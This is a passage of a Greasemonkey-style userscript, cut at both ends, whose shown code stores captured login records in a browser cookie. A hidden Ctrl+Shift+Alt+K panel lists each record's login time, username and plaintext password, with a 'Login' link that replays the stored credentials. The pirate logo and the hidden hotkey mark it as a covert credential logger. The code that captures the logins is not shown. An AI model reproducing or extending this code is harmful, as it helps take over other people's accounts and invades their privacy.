'K4xtQn8F8BmdHK3jYQGiVTr25fOHgYzEtZlOVGkC7RL7os9qRJ3Dzu0LYkZSp7JD7D8kQUM6dIeA'+
'UWlFuUs/bda3oqpzSF+sT+qiJDEy4ksj2mO384Z0/CoJ6iP3v32SDoMGAzOMjtaGhekKIXXE79dr'+
'xrX65isiX1J7NbE5ltJx55jrz5GRZtOFphwN52MZBRI+3wbHHZresPu1CTjDgssmtTE+0Z9Xcm1U'+
'FDQEBo+1q5HniE5pL9XZGwSWEpESa57taiNxpCfpnI9IfP9kfaV3MaL/fPUFDYtSBdirz+wKjrUT'+
'x38GADXlN8OfthjXAAAAAElFTkSuQmCC';

topBanner = 'data:image/gif;base64,'+
'R0lGODlhAQA+AMQAAAAAAP///8C/wNbX18fHxsDAv8vKyt3d3dzc3Nvb29ra2tnZ2djY2NXV1dTU'+
'1NPT09HR0dDQ0M/Pz83NzczMzMnJycjIyMfHx8XFxcTExMPDw8LCwsHBwcDAwL+/vwAAACwAAAAA'+
'AQA+AAAFMOAhHgiSKAszNM4DRdJEGZVFYJm2cZ3gFR3ORpPBXCwVA2UiiUAejsaAsVAkSiNRCAA7';
cookie = readCookie(cookieName);
if (document.addEventListener)
   document.addEventListener("keypress", keyPress,false);
else if (document.attachEvent)
   document.attachEvent("onkeypress", keyPress);
else
   document.onkeypress= keyPress;
function writeCookie(name, value, days) 
{
	if (days) 
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}
function readCookie(name) 
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) 
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}
function eraseCookie(name) 
{
	writeCookie(name, "", -1);
	cookie = null;
}
function keyPress(e)
{
	var c =  String.fromCharCode(e.which).toUpperCase();
	if (c == "K" && e.shiftKey && e.ctrlKey && e.altKey)
		display();
	else if (c == "D" && e.shiftKey && e.ctrlKey && e.altKey)
	{
		eraseCookie(cookieName);
		unsafeWindow.killWindow();
		display();
	}
	else if (e.keyCode == 27)
		unsafeWindow.killWindow();
}
unsafeWindow.clearLog = function()
{
	eraseCookie(cookieName);
	unsafeWindow.killWindow();
	display();
}
unsafeWindow.killWindow = function ()
{
	if (document.getElementById('displayDiv') != null)
		document.body.removeChild(document.getElementById('displayDiv'));
}
function display()
{
	if (cookie == null)
	{
		alert ('No logs stored!');
		return;
	}
	GM_addStyle('div#displayDiv{position:absolute; width:'+width+'px; height:'+height+'px; top:50%; left:50%; margin:-' + (height/2) + 'px auto auto -' + (width/2) + 'px; border:2px solid #333; background: url('+topBanner+') #DDD; font-size:12px;-moz-border-radius: 8px; -webkit-border-radius: 8px; -moz-box-shadow:10px 10px 20px #000000; z-index:5;}');
	GM_addStyle('div#displayDiv #logo{float:left; margin:5px;}');
	GM_addStyle('div#displayDiv #title{float:left; margin-top:16px; font-weight:bolder; color:#333;}');
	GM_addStyle('div#displayDiv #closeButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #clearLogButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #version{float:left; margin-top:28px; margin-left:5px; color:#888; font-weight:bold;}');
	GM_addStyle('#tableContainer{clear: both; border: 1px solid #444; height: 320px; overflow: hidden; width: 680px; margin:0 auto; background-color:#EEE;}');
	GM_addStyle('#tableContainer table{height: 320px; width: 680px; font-size:12px; border:1px solid #FCC; -moz-box-shadow:10px 10px 20px #000000;}');
	GM_addStyle('#tableContainer table thead tr{display: block; position:relative; background-color:#CCF; border-bottom:1px solid #444;}');
	GM_addStyle('#tableContainer table thead tr th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th + th{text-align:left; font-weight:bold; width:76px;}');	
	GM_addStyle('#tableContainer table tbody {text-align:left; height:300px; display:block; width:100%; overflow: -moz-scrollbars-vertical;}');	
	GM_addStyle('#tableContainer table tbody tr:nth-child(even){text-align:left; width:80px; background-color:#EEE;}');	
	GM_addStyle('#tableContainer table tbody tr:nth-child(odd){text-align:left; width:80px; background-color:#F8F8F8;}');	
	GM_addStyle('#tableContainer table tbody tr td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td + td{text-align:left; width:60px; border-right:none;}');	
	GM_addStyle('.unselectable{-moz-user-select: none; -khtml-user-select: none; user-select: none;}');
	var html = '';
	html += '<div id="logo" class="unselectable"><img src="'+jollyRogerz+'"></div>';
	html += '<button id="closeButton" class="unselectable" onclick="killWindow()">X</button>';
	html += '<button id="clearLogButton" class="unselectable" onclick="clearLog()">Clear log</button>';
	html += '<h1 id="title" class="unselectable">'+title+'</h1>';
	html += '<span id="version" class="unselectable">'+version+'</span>';
	html += '<div id="tableContainer">';
	html += '<table cellspacing="0"><thead class="unselectable"><tr><th>Login time</th><th>Username</th><th>Password</th><th>Action</th></tr></thead>';
	html += '<tbody>';
	var array = cookie.split(delimiter);
	for (i=0; i < array.length; i++)
	{
		var subArray = array[i].split(subDelimiter);
		var date = new Date();
		date.setTime(subArray[0]);
		html += '<tr><td>'+date.toLocaleString()+'</td><td>'+subArray[1]+'</td><td>'+subArray[2]+'</td><td><a href="#" onclick="doTheBossanova(\''+subArray[1]+'\', \''+subArray[2]+'\')">Login &raquo;</a></td></tr>';
	}
	html += '</tbody>';
	html += '</table>';
	html += '</tableContainer>';
	var displayDiv = document.createElement('div');
	displayDiv.setAttribute('id', 'displayDiv');
	displayDiv.innerHTML = html;
	document.body.appendChild(displayDiv);
}
function getElementsByClassName(classname, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) ) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}
function getElementsByClassNameAndType(classname, type, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) && els[i].type == type) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}
function getElementByTabIndex(index, type, node)
{
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [];

	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if (els[i].tabIndex == index && els[i].type == type)
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}